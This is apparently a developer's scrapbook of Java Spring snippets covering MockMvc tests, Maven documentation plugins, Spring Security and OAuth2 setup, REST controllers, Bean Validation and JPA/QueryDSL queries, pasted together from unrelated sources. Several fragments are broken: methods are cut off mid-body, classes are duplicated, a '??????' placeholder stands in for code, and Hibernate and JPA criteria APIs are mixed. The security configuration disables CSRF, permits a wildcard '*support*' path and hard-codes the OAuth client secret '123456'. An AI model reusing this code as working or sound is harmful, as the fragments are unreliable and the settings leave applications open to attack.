        this.mockMvc.perform(post("/" + userName + "/bookmarks")
                .contentType(contentType)
                .content(bookmarkJson))
                .andExpect(status().isCreated());
    }

    protected String json(Object o) throws IOException {
        MockHttpOutputMessage mockHttpOutputMessage = new MockHttpOutputMessage();
        this.mappingJackson2HttpMessageConverter.write(
                o, MediaType.APPLICATION_JSON, mockHttpOutputMessage);
        return mockHttpOutputMessage.getBodyAsString();
    }
}
-------------------------------------------------------------------------------------------------------
<plugin>
    <groupId>io.github.swagger2markup</groupId>
    <artifactId>swagger2markup-maven-plugin</artifactId>
    <version>1.3.3</version>
    <configuration>
        <swaggerInput>${project.build.directory}/generated-sources/swagger.json</swaggerInput>
        <outputDir>${project.build.directory}/generated-sources/swagger/</outputDir>
        <config>
            <swagger2markup.markupLanguage>ASCIIDOC</swagger2markup.markupLanguage>
        </config>
    </configuration>
    <executions>
        <execution>
            <phase>prepare-package</phase>
            <goals>
                <goal>convertSwagger2markup</goal>
            </goals>
        </execution>
    </executions>
</plugin>

<plugin>
    <groupId>org.asciidoctor</groupId>
    <artifactId>asciidoctor-maven-plugin</artifactId>
    <version>1.5.3</version>
    <dependencies>
        <dependency>
            <groupId>org.jruby</groupId>
            <artifactId>jruby-complete</artifactId>
            <version>1.7.21</version>
        </dependency>
    </dependencies>
    <configuration>
        <sourceDirectory>${project.basedir}/src/main/asciidoc/</sourceDirectory>
        <sourceDocumentName>index.adoc</sourceDocumentName>
        <backend>html5</backend>
        <outputDirectory>${project.build.directory}/generated-sources/swagger-html/</outputDirectory>
        <attributes>
            <toc>left</toc>
            <toclevels>3</toclevels>
            <generated>${project.build.directory}/generated-sources/swagger/</generated>
        </attributes>
    </configuration>

    <executions>
        <execution>
            <id>output-html</id>
            <phase>prepare-package</phase>
            <goals>
                <goal>process-asciidoc</goal>
            </goals>
        </execution>
    </executions>
</plugin>
-------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebMvcSecurity
@ComponentScan
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    /**
     * Instantiates a new web security config.
     */
    public WebSecurityConfig() {

        super();
    }

    /**
     * {@inheritDoc}
     * @see org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter#configure(org.springframework.security.config.annotation.web.builders.HttpSecurity)
     */
    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http.authorizeRequests()
            .antMatchers("/login", "/logoffUser", "/sessionExpired", "/error", "/unauth", "/redirect", "*support*").permitAll()
            .anyRequest().authenticated().and().rememberMe().and().httpBasic()
            .and()
            .csrf()
            .disable().logout().deleteCookies("JSESSIONID").logoutSuccessUrl("/logoff").invalidateHttpSession(true);
    }


    @Autowired
    public void configAuthentication(AuthenticationManagerBuilder auth) throws Exception {

      auth.userDetailsService(userDetailsService).passwordEncoder(new BCryptPasswordEncoder());
    }

}
-------------------------------------------------------------------------------------------------------
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.apache.catalina.security.SecurityConfig;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import com.something.configuration.SomethingConfig;

@RunWith(SpringRunner.class)
@SpringBootTest(classes = { SomethingConfig.class, SecurityConfig.class }) //All your configuration classes
@EnableAutoConfiguration
@WebAppConfiguration // for MVC configuration
@EnableJpaRepositories("com.something.persistence.dataaccess")  //JPA repositories
@EntityScan("com.something.domain.entity.*")  //JPA entities
@ComponentScan("com.something.persistence.fixture") //any component classes you have
public class SomethingApplicationTest {

@Autowired
private WebApplicationContext ctx;
private MockMvc mockMvc;

@Before
public void setUp() {
    this.mockMvc = MockMvcBuilders.webAppContextSetup(ctx).build();
}

@Test
public void loginTest() throws Exception {
    this.mockMvc.perform(get("/something/login")).andDo(print()).andExpect(status().isOk());
}
-------------------------------------------------------------------------------------------------------
@EnableDiscoveryClient
-------------------------------------------------------------------------------------------------------
keytool -genkey -alias bookmarks -keyalg RSA -keystore src/main/resources/tomcat.keystore
-------------------------------------------------------------------------------------------------------
@Configuration
class WebSecurityConfiguration extends GlobalAuthenticationConfigurerAdapter {

	@Autowired
	AccountRepository accountRepository;

	@Override
	public void init(AuthenticationManagerBuilder auth) throws Exception {
		auth.userDetailsService(userDetailsService());
	}

	@Bean
	UserDetailsService userDetailsService() {
		return (username) -> accountRepository
				.findByUsername(username)
				.map(a -> new User(a.username, a.password, true, true, true, true,
						AuthorityUtils.createAuthorityList("USER", "write")))
				.orElseThrow(
						() -> new UsernameNotFoundException("could not find the user '"
								+ username + "'"));
	}
}
-------------------------------------------------------------------------------------------------------

@Configuration
@EnableResourceServer
@EnableAuthorizationServer
class OAuth2Configuration extends AuthorizationServerConfigurerAdapter {

	String applicationName = "bookmarks";

	// This is required for password grants, which we specify below as one of the
	// {@literal authorizedGrantTypes()}.
	@Autowired
	AuthenticationManagerBuilder authenticationManager;

	@Override
	public void configure(AuthorizationServerEndpointsConfigurer endpoints)
			throws Exception {
		// Workaround for https://github.com/spring-projects/spring-boot/issues/1801
		endpoints.authenticationManager(new AuthenticationManager() {
			@Override
			public Authentication authenticate(Authentication authentication)
					throws AuthenticationException {
				return authenticationManager.getOrBuild().authenticate(authentication);
			}
		});
	}

	@Override
	public void configure(ClientDetailsServiceConfigurer clients) throws Exception {

		clients.inMemory().withClient("android-" + applicationName)
				.authorizedGrantTypes("password", "authorization_code", "refresh_token")
				.authorities("ROLE_USER").scopes("write").resourceIds(applicationName)
				.secret("123456");
	}
}

class BookmarkResource extends ResourceSupport {

	private final Bookmark bookmark;

	public BookmarkResource(Bookmark bookmark) {
		String username = bookmark.getAccount().getUsername();
		this.bookmark = bookmark;
		this.add(new Link(bookmark.uri, "bookmark-uri"));
		this.add(linkTo(BookmarkRestController.class, username).withRel("bookmarks"));
		this.add(linkTo(
				methodOn(BookmarkRestController.class, username).readBookmark(null,
						bookmark.getId())).withSelfRel());
	}

	public Bookmark getBookmark() {
		return bookmark;
	}
}
-------------------------------------------------------------------------------------------------------
  /** POST /newss -> Create a new news. */
  @RequestMapping(
      value = "/newss",
      method = RequestMethod.POST,
      produces = MediaType.APPLICATION_JSON_VALUE)
  @Timed
  public ResponseEntity<News> createNews(@Valid @RequestBody News news) throws URISyntaxException {
    log.debug("REST request to save News : {}", news);
    if (news.getId() != null) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert(
                  "news", "idexists", "A new news cannot already have an ID"))
          .body(null);
    }
    News result = newsRepository.save(news);
    List<Subscription> subscriptions =
        subscriptionRepository
            .findAll()
            .stream()
            .filter(item -> (item.getIdMarketPlace().equals(result.getMarketPlace().getId())))
            .collect(Collectors.toList());
    String title = result.getMarketPlace().getName() + " vous a envoyé une News !";
    String content = result.getTitle() + "\n\n\n" + result.getContent();

    for (Subscription subscription : subscriptions) {
      mailService.sendEmail(subscription.getUser().getEmail(), title, content, false, false);
    }
    return ResponseEntity.created(new URI("/api/newss/" + result.getId()))
        .headers(HeaderUtil.createEntityCreationAlert("news", result.getId().toString()))
        .body(result);
  }
-------------------------------------------------------------------------------------------------------
 /**
   * POST /users : Creates a new user.
   *
   * <p>Creates a new user if the login and email are not already used, and sends an mail with an
   * activation link. The user needs to be activated on creation.
   *
   * @param managedUserVM the user to create
   * @return the ResponseEntity with status 201 (Created) and with body the new user, or with status
   *     400 (Bad Request) if the login or email is already in use
   * @throws URISyntaxException if the Location URI syntax is incorrect
   */
  @PostMapping("/users")
  @Timed
  @Secured(AuthoritiesConstants.ADMIN)
  public ResponseEntity<?> createUser(@RequestBody ManagedUserVM managedUserVM)
      throws URISyntaxException {
    log.debug("REST request to save User : {}", managedUserVM);

    // Lowercase the user login before comparing with database
    if (userRepository.findOneByLogin(managedUserVM.getLogin().toLowerCase()).isPresent()) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert("userManagement", "userexists", "Login already in use"))
          .body(null);
    } else if (userRepository.findOneByEmail(managedUserVM.getEmail()).isPresent()) {
      return ResponseEntity.badRequest()
          .headers(
              HeaderUtil.createFailureAlert(
                  "userManagement", "emailexists", "Email already in use"))
          .body(null);
    } else {
      User newUser = userService.createUser(managedUserVM);
      mailService.sendCreationEmail(newUser);
      return ResponseEntity.created(new URI("/api/users/" + newUser.getLogin()))
          .headers(HeaderUtil.createAlert("userManagement.created", newUser.getLogin()))
          .body(newUser);
    }
  }
-------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {
        MockHttpServletRequestBuilder builder =
                                      MockMvcRequestBuilders.post("/test")
                                        .header("testHeader",
                                                "headerValue")
                                        .content("test body");
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
					
@Controller
@RequestMapping
public class MyController {

   @RequestMapping("/user")
    public ResponseEntity<String> handleUserRequest (RequestEntity<User> requestEntity) {
        User user = requestEntity.getBody();
        System.out.println("request body: " + user);
        System.out.println("request headers " + requestEntity.getHeaders());
        System.out.println("request method : " + requestEntity.getMethod());

        MultiValueMap<String, String> headers = new HttpHeaders();
        headers.put("Cache-Control", Arrays.asList("max-age=3600"));

        ResponseEntity<String> responseEntity = new ResponseEntity<>("my response body",
                                                                     headers,
                                                                     HttpStatus.OK);
        return responseEntity;
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {

        MockHttpServletRequestBuilder builder =
                                   MockMvcRequestBuilders.post("/user")
                                        .header("testHeader",
                                                "headerValue")
                                        .contentType(MediaType.APPLICATION_JSON)
                                        .content(createUserInJson("joe",
                                                            "joe@example.com"));
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
    }

    private static String createUserInJson (String name, String email) {
        return "{ \"name\": \"" + name + "\", " +
                            "\"emailAddress\":\"" + email + "\"}";
    }
}
-------------------------------------------------------------------------------------------------------
  public class User {
    @NotNull(groups = GroupUserName.class)
    String firstName;
    @NotNull(groups = GroupUserName.class)
    String lastName;

    @NotNull(groups = GroupAddress.class)
    String streetAddress;
    @NotNull(groups = GroupAddress.class)
    String country;
    @NotNull(groups = GroupAddress.class)
    @Size(min = 5, groups = GroupAddress.class)
    String zipCode;

    @NotNull
    String userId;

    //getters and setters
  }
  
     validator.validate(user, GroupUserName.class,
                      GroupAddress.class, Default.class);
					  
import javax.validation.GroupSequence;
import javax.validation.groups.Default;

@GroupSequence({Default.class, GroupUserName.class, GroupAddress.class})
public interface GroupSequenceForUser {
}

 @GroupSequence({User2.class, GroupUserName.class, GroupAddress.class})
 public class User2 {
    @NotNull(groups = GroupUserName.class)
    String firstName;
    @NotNull(groups = GroupUserName.class)
    String lastName;

    @NotNull(groups = GroupAddress.class)
    String streetAddress;
    @NotNull(groups = GroupAddress.class)
    String country;
    @NotNull(groups = GroupAddress.class)
    @Size(min = 5, groups = GroupAddress.class)
    String zipCode;

    @NotNull
    String userId;

   // getters and setters
}
-------------------------------------------------------------------------------------------------------
    TestBean test = new TestBean();
    int[] testNumbers = test.findNumbers();

    Method method = TestBean.class.getDeclaredMethod("findNumbers");

    ExecutableValidator executableValidator = validator.forExecutables();
    Set<ConstraintViolation<TestBean>> violations =
                            executableValidator.validateReturnValue(test,
                                                method, testNumbers);

    if (violations.size() > 0) {
        violations.stream().forEach(MethodReturnValidationExample::printError);
    } else {
        //proceed using TestBean object
    }
-------------------------------------------------------------------------------------------------------
    public class User {
        private final String name;
        private final String phone;

        public User (@NotNull String name,
                     @NotNull
                     @Pattern(regexp = "(\\d){3,3}-\\d{3,3}-\\d{4,4}",
                     message = "must match 111-111-1111 format")
                     String phone) {
            this.name = name;
            this.phone = phone;
        }
      ....
    }
	
	public class Test{
    public static void main (String[] args) throws NoSuchMethodException {

        javax.validation.Validator validator =  ....

        String userName = null;
        String userPhone = "223-223-222";

        ExecutableValidator executableValidator = validator.forExecutables();

        Set<ConstraintViolation<User>> constraintViolations =
                            executableValidator.validateConstructorParameters(
                              User.class.getConstructor(String.class, String.class),
                                                 new  Object[]{userName, userPhone});

        if (constraintViolations.size() > 0) {
            constraintViolations.stream().forEach(Test::printError);
        } else {
            User user = new User(userName, userPhone);
            System.out.println(user);
        }
    }

    private static void printError (
                        ConstraintViolation<User> violation) {
        System.out.println(violation.getPropertyPath() + " " + violation.getMessage());
    }
-------------------------------------------------------------------------------------------------------
    .................. 
    CriteriaUpdate<Employee> criteriaUpdate = criteriaBuilder.createCriteriaUpdate(Employee.class);
    Root<Employee> employeeRoot = criteriaUpdate.from(Employee.class);
    criteriaUpdate.set(employeeRoot.get(Employee_.salary),
            criteriaBuilder.sum(employeeRoot.get(Employee_.salary), 500d))
                  .where(criteriaBuilder.equal(employeeRoot.get(Employee_.DEPT), "IT"));
    //the equivalent JPQL
    //UPDATE Employee e SET e.salary = e.salary + 500 WHERE e.dept = 'IT'
    entityManager.getTransaction().begin();
    int i = entityManager.createQuery(criteriaUpdate).executeUpdate();
    System.out.println("Entities updated: " + i);
    entityManager.getTransaction().commit();
    ..................
-------------------------------------------------------------------------------------------------------
SHOW COLUMNS from person
-------------------------------------------------------------------------------------------------------
https://www.logicbig.com/tutorials/java-ee-tutorial/bean-validation/predefined_constraints.html

  private static EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory("example-unit");
  
  private static void findEmployees() {
      EntityManager entityManager = entityManagerFactory.createEntityManager();
      CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
      CriteriaQuery<Employee> criteriaQuery = criteriaBuilder.createQuery(Employee.class);
      Root<Employee> root = criteriaQuery.from(Employee.class);
      criteriaQuery.select(root);

      System.out.println("-- All employees --");
      List<Employee> resultList = entityManager.createQuery(criteriaQuery).getResultList();
      resultList.forEach(System.out::println);


      System.out.println("-- All employees from IT dept --");
      criteriaQuery.where(criteriaBuilder.equal(root.get(Employee_.DEPT), "IT"));
      List<Employee> resultList2 = entityManager.createQuery(criteriaQuery).getResultList();
      resultList2.forEach(System.out::println);

      entityManager.close();
  }

  private static void findEmployees2() {
      EntityManager entityManager = entityManagerFactory.createEntityManager();
      CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
      CriteriaQuery<Object[]> criteriaQuery = criteriaBuilder.createQuery(Object[].class);
      Root<Employee> root = criteriaQuery.from(Employee.class);

      System.out.println("-- Employees name and salary --");
      criteriaQuery.multiselect(root.get(Employee_.NAME), root.get(Employee_.SALARY));
      List<Object[]> resultList = entityManager.createQuery(criteriaQuery).getResultList();
      resultList.forEach(arr -> System.out.println(Arrays.toString(arr)));

      System.out.println("-- Employees name and dept --");
      criteriaQuery.multiselect(root.get(Employee_.NAME), root.get(Employee_.DEPT));
      List<Object[]> resultList2 = entityManager.createQuery(criteriaQuery).getResultList();
      resultList2.forEach(arr -> System.out.println(Arrays.toString(arr)));

      entityManager.close();
  }
  
  CriteriaQuery<Item> query = criteriaBuilder.createQuery(Item.class);
  Root<Customer> customer = query.from(Customer.class);
  ListJoin<Order, Item> items = customer.join(Customer_.orders)
                                        .join(Order_.items);
  query.select(items)
       .where(criteriaBuilder.equal(customer.get(Customer_.shipmentInfo)
                                    .get(ShipmentInfo_.address)
                                    .get(Address_.state), "NJ"));
									
  CriteriaQuery<Employee> criteriaQuery = criteriaBuilder.createQuery(Employee.class);
   Root<Employee> employee = criteriaQuery.from(Employee.class);
   criteriaQuery.select(employee)
                .where(criteriaBuilder.isMember(criteriaBuilder.literal("222-222-222"),
                                                    employee.get(Employee_.phoneNumbers)));
  TypedQuery<Employee> typedQuery = entityManager.createQuery(criteriaQuery);
  List<Employee> list = typedQuery.getResultList();
  
  
 CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
  CriteriaQuery<Employee> query = criteriaBuilder.createQuery(Employee.class);
  Root<Employee> employee = query.from(Employee.class);
  employee.fetch(Employee_.tasks, JoinType.INNER);
  query.select(employee)
       .distinct(true);
  TypedQuery<Employee> typedQuery = entityManager.createQuery(query);
  List<Employee> resultList = typedQuery.getResultList();
  
  
  CriteriaBuilder builder = entityManager.getCriteriaBuilder();
CriteriaQuery<FileEntity> criteria = builder.createQuery(FileEntity.class);
Root<FileEntity> fromPerson = criteria.from(FileEntity.class);
criteria.select(fromPerson).where(builder.equal(fromPerson.get("version"), 1000));
TypedQuery<FileEntity> query = entityManager.createQuery(criteria);
List<FileEntity> peeps = query.getResultList();

Criteria criteria = entityManager.createCriteria(Person.class);
Criteria languageCriteria = criteria.createCriteria("language");

languageCriteria.add(Restrictions.like("locale", locale));

criteria.add(Restrictions.like("name", name));
criteria.add(Restrictions.between("time", startDate, endDate));

criteria.addOrder(Order.asc("name"));

and my first try at JPA 2.0:

CriteriaBuilder builder = entityManager.getCriteriaBuilder();
CriteriaQuery<Person> criteria = builder.createCriteria(Person.class);
Root<Person> pRoot = criteria.from(Person.class);
Join<Person, Language> langJoin = criteria.join("language", JoinType.LEFT);

Predicate conjunction = builder.conjunction();

criteria.where(builder.and(
    builder.like(langJoin.get(Language_.locale), locale),
    builder.like(pRoot.get(Person_.name), name),
    builder.between(pRoot.get(Person_.time), startDate, endDate));

criteria.orderBy(builder.asc(pRoot.get(Person_.name)));
  
  private static void findEmployeesWithTasks() {
      System.out.println("-- find employees with tasks --");
      EntityManager em = entityManagerFactory.createEntityManager();
      CriteriaBuilder cb = em.getCriteriaBuilder();
      CriteriaQuery<Employee> query = cb.createQuery(Employee.class);
      Root<Employee> employee = query.from(Employee.class);
      employee.fetch(Employee_.tasks, JoinType.LEFT);
      query.select(employee)
           .distinct(true);
      TypedQuery<Employee> typedQuery = em.createQuery(query);
      List<Employee> resultList = typedQuery.getResultList();
      for (Employee e : resultList) {
          System.out.println(e.getName() + " - " + e.getTasks());
      }
  }
  
  CriteriaBuilder cb = em.getCriteriaBuilder(); 
  CriteriaQuery<Employee> query = cb.createQuery(Employee.class);//create query object
  Root<Employee> employee = query.from(Employee.class);//create object representing 'from' part
  query.select(employee);//create 'select from' part
  query.orderBy(
        cb.asc(employee.get(Employee_.dept)),
        cb.desc(employee.get(Employee_.salary))
   );
   
@Entity
@NamedQuery(name = Employee.SALARY_RANGE_QUERY,
      query = "SELECT e FROM Employee e WHERE e.salary BETWEEN :min AND :max order by e.salary")
@NamedQuery(name = Employee.SALARY_LESS_THAN_AVERAGE_QUERY,
      query = "SELECT e FROM Employee e where  e.salary < (SELECT AVG(e2.salary) FROM Employee e2)")
public class Employee {
  public static final String SALARY_RANGE_QUERY = "salaryRangeQuery";
  public static final String SALARY_LESS_THAN_AVERAGE_QUERY = "salaryLessThanAverageQuery";
  @Id
  @GeneratedValue
  private long id;
  private String name;
  private Timestamp joinDate;
  private long salary;
    .............
}

  private static void findEmployeeBySalaryRange() {
      System.out.println("-- Employee by salary range --");
      EntityManager em = entityManagerFactory.createEntityManager();
      Query query = em.createNamedQuery(Employee.SALARY_RANGE_QUERY);
      query.setParameter("min", 2000L);
      query.setParameter("max", 4000L);
      List<Employee> resultList = query.getResultList();
      resultList.forEach(System.out::println);
      em.close();
  }

  private static void findEmployeeWithLessThanAverageSalary() {
      System.out.println("-- Employee with salary less than average --");
      EntityManager em = entityManagerFactory.createEntityManager();
      Query query = em.createNamedQuery(Employee.SALARY_LESS_THAN_AVERAGE_QUERY);
      List<Employee> resultList = query.getResultList();
      resultList.forEach(System.out::println);
      em.close();
  }

  public static void persistEmployees() {
      Employee employee1 = Employee.create("Diana", 3000, LocalDate.of(1999, 11, 15));
      Employee employee2 = Employee.create("Rose", 4000, LocalDate.of(2011, 5, 1));
      Employee employee3 = Employee.create("Denise", 1500, LocalDate.of(2006, 1, 10));
      Employee employee4 = Employee.create("Mike", 2000, LocalDate.of(2015, 8, 20));
      EntityManager em = entityManagerFactory.createEntityManager();
      em.getTransaction().begin();
      em.persist(employee1);
      em.persist(employee2);
      em.persist(employee3);
      em.persist(employee4);
      em.getTransaction().commit();
      em.close();
  }

  private static Timestamp localToTimeStamp(LocalDate date) {
      return Timestamp.from(date.atStartOfDay().toInstant(ZoneOffset.UTC));
  }
-------------------------------------------------------------------------------------------------------
@Entity
@Access(AccessType.FIELD)
public class MutualFund implements Serializable {

    @Id
    private final String schemeName;

    @Convert(attributeName="key",converter=LocalDatePersistenceConverter.class)
    @ElementCollection
    private Map<LocalDate, Price> nav;

    //Other fields and methods
}
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.service.impl;

import com.paragon.mailingcontour.commons.utils.ValidationUtils;
import com.paragon.microservices.distributor.model.domain.FileParameters;
import com.paragon.microservices.distributor.model.domain.FileSearchParameters;
import com.paragon.microservices.distributor.model.domain.VersionParameters;
import com.paragon.microservices.distributor.model.entity.FileEntity;
import com.paragon.microservices.distributor.model.entity.LocaleInfoEntity;
import com.paragon.microservices.distributor.model.entity.QFileEntity;
import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
import com.paragon.microservices.distributor.repository.FileRepository;
import com.paragon.microservices.distributor.service.interfaces.FileService;
import com.paragon.microservices.distributor.service.interfaces.VersionService;
import com.paragon.microservices.distributor.system.formatter.VersionInfoFormatter;
import com.paragon.microservices.distributor.system.utils.ServiceUtils;
import com.querydsl.core.types.Predicate;
import com.querydsl.core.types.dsl.BooleanExpression;
import com.querydsl.jpa.HQLTemplates;
import com.querydsl.jpa.impl.JPAQueryFactory;
import lombok.*;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Isolation;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.validation.annotation.Validated;

import java.text.ParseException;
import java.util.*;

import static com.paragon.mailingcontour.commons.exception.ResourceNotFoundException.throwResourceNotFound;
import static com.paragon.microservices.distributor.exception.EmptyContentException.throwEmptyContent;
import static com.paragon.microservices.distributor.exception.InvalidFormatException.throwInvalidFormat;
import static com.paragon.microservices.distributor.system.utils.ServiceUtils.DEFAULT_COMPLETABLE_ACTION;
import static com.paragon.microservices.distributor.system.utils.ServiceUtils.copyNonNullProperties;

/**
 * {@link FileService} implementation
 */
@Slf4j
@Validated
@Service
@EqualsAndHashCode(callSuper = true)
@ToString(callSuper = true)
@Getter(AccessLevel.PROTECTED)
@RequiredArgsConstructor
public class FileServiceImpl extends AuditServiceImpl<FileEntity, QFileEntity, UUID> implements FileService {
    /**
     * Default version format error messages
     */
    public static final String ERROR_VERSION_FORMAT_INVALID_MESSAGE_TEMPLATE = "error.version.format.invalid";
    public static final String ERROR_RESOURCE_BY_REQUEST_NOT_FOUND_MESSAGE_TEMPLATE = "error.resource.by.request.not-found";

    private final FileRepository fileRepository;
    private final VersionService versionService;
    private final VersionInfoFormatter versionInfoFormatter;

    @Override
    public Optional<FileEntity> getFileRecord(final FileParameters fileParameters) {
        log.info("Fetching file record by parameters: {}", fileParameters);
        return this.getRepository().findByProductVersionFileId(fileParameters.getProductId(), fileParameters.getVersionId(), fileParameters.getBinaryId());
    }

    @Override
    public <S extends FileEntity> Iterable<S> getAllFileRecords(final VersionParameters versionParameters) {
        log.info("Fetching all file records by parameters: {}", versionParameters);
        return this.getRepository().<S>findAllByProductVersionId(versionParameters.getProductId(), versionParameters.getVersionId())
                .thenApply(ServiceUtils::ofEmpty)
                .whenCompleteAsync(DEFAULT_COMPLETABLE_ACTION, this.getAsyncTaskExecutor())
                .join()
                .orElseThrow(() -> throwEmptyContent(this.getMessageSource()));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public FileEntity createFileRecord(final VersionParameters versionParameters, final FileEntity fileEntity) {
        log.info("Creating new file record by parameters: {}, fileEntity: {}", versionParameters, fileEntity);
        return this.getVersionService().getVersionRecord(versionParameters)
                .map(entity -> {
                    fileEntity.setVersion(entity);
                    return fileEntity;
                })
                .map(this::save)
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, versionParameters));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public FileEntity updateFileRecord(final FileParameters fileParameters, final FileEntity fileEntity) {
        log.info("Updating file record by parameters: {}, entity: {}", fileParameters, fileEntity);
        return this.getFileRecord(fileParameters)
                .map(entity -> {
                    copyNonNullProperties(fileEntity, entity);
                    return entity;
                })
                .map(this::save)
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, fileParameters));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public FileEntity deleteFileRecord(final FileParameters fileParameters) {
        log.info("Removing file record by parameters: {}", fileParameters);
        return this.getFileRecord(fileParameters)
                .map(entity -> {
                    final Set<FileEntity> files = entity.getVersion().getFiles();
                    Optional.ofNullable(files).ifPresent(f -> f.removeIf(current -> Objects.equals(current, entity)));
                    this.delete(entity);
                    return entity;
                })
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, fileParameters));
    }

    /**
     * Returns {@link FileEntity} by input {@link FileSearchParameters} parameters
     *
     * @param searchParameters - initial input {@link FileSearchParameters} to fetch by
     * @return {@link FileEntity}
     */
    @Override
    public FileEntity searchFileRecord(final FileSearchParameters searchParameters) {
        log.info("Fetching file record by input search parameters: {}", searchParameters);
        final Predicate predicate = this.buildFileRecordSearchPredicate(searchParameters);
        return this.getFileRepository().findOne(predicate).orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_BY_REQUEST_NOT_FOUND_MESSAGE_TEMPLATE, searchParameters));
    }

    /**
     * Returns {@link FileEntity} search {@link Predicate} by input search parameters
     *
     * @param searchParameters - initial input {@link FileSearchParameters} to build search predicate by
     * @return {@link FileEntity} search {@link Predicate}
     */
    private Predicate buildFileRecordSearchPredicate(final FileSearchParameters searchParameters) {
        ValidationUtils.checkNotNull(searchParameters, "File search parameters should not be null");

//        CriteriaBuilder builder = this.getEntityManager().getCriteriaBuilder();
//        CriteriaQuery<FileEntity> criteria = builder.createQuery(FileEntity.class);
//        Root<FileEntity> fromPerson = criteria.from(FileEntity.class);

//        javax.persistence.criteria.Predicate greaterThanPrice = builder.equal(fromPerson.get(FileEntity_.version).get(VersionEntity_.product).get(ProductEntity_.sku), searchParameters.getSku());
//        javax.persistence.criteria.Predicate chairItems = builder.equal(fromPerson.get(FileEntity_.fileInfo).get(FileInfoEntity_.filePlatform), searchParameters.getPlatform());
//        javax.persistence.criteria.Predicate chairItems2 = builder.equal(fromPerson.get(FileEntity_.version).get(VersionEntity_.versionInfo), this.buildVersionInfo(searchParameters.getVersion()));
//        javax.persistence.criteria.Predicate chairItems3 = builder.isMember(new LocaleInfoEntity(searchParameters.getLocale()), fromPerson.get(FileEntity_.version).get(VersionEntity_.locales));

//        criteria.select(fromPerson).where(builder.and(greaterThanPrice, chairItems, chairItems2, chairItems3));
//        TypedQuery<FileEntity> query = this.getEntityManager().createQuery(criteria);
//        List<FileEntity> peeps = query.getResultList();

public List<Group> findGroupsByUser(Integer userId) {
    JPQLQuery query = new JPAQuery(getEntityManager());
    ??????
    return result;
}

final JPAQueryFactory queryFactory = new JPAQueryFactory(HQLTemplates.DEFAULT, this.getEntityManager());
final QFileEntity file = QFileEntity.fileEntity;
final QVersionEntity version = QVersionEntity.versionEntity;
final QLocaleVersionEntity localeVersion = QLocaleVersionEntity.localeVersionEntity;
final FileEntity fileEntity = queryFactory
        .selectFrom(file)
        .innerJoin(file.version, version)
        .innerJoin(file.version.locales, localeVersion)
        .where(
                file.fileInfo.filePlatform.eq("x86")
                        .and(version.versionInfo.tokens.eq(new int[]{1, 2, 3, 4}))
                        .and(version.product.sku.eq("sku-333d497a"))
                        .and(localeVersion.locale().localeName.eq("ru"))
        )
        .fetchOne();

final JPAQueryFactory queryFactory = new JPAQueryFactory(HQLTemplates.DEFAULT, this.getEntityManager());
final QFileEntity file = QFileEntity.fileEntity;
final QVersionEntity version = QVersionEntity.versionEntity;
final QLocaleVersionEntity localeVersion = QLocaleVersionEntity.localeVersionEntity;
final FileEntity fileEntity = queryFactory
        .selectFrom(file)
        .innerJoin(file.version, version)
        .innerJoin(file.version.locales, localeVersion)
        .where(
                file.fileInfo.filePlatform.eq("x86")
                        .and(version.versionInfo.eq(this.buildVersionInfo("4.6.7.8")))
                        .and(version.product.sku.eq("sku-333d497a"))
                        .and(localeVersion.id.locale.localeName.eq("za"))
        )
        .fetchOne();

